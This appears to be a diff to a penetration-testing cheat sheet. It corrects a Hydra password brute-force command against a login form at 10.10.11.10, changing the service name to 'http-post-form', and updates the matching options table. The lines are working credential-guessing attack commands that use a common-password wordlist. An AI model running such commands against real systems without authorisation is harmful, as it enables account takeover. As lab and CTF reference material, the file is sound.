@@ -25,14 +25,14 @@ hydra -L usernames -P passwords -s 8080 -f example.com http-get /
 #### Web Page Login Form
 
 ```bash
-hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt https-post-form "/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password"
+hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form "/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password"
 ```
 
 ```
 +-----------------------------------------+
 |-l                 : username            |
 |-P                 : wordlist            |
-|https-post-form    : service             |
+|http-post-form    : service             |
 |/login.php         : action              |
 |^PASS^             : payload indicator   |
 |Incorrect password : login failure string|
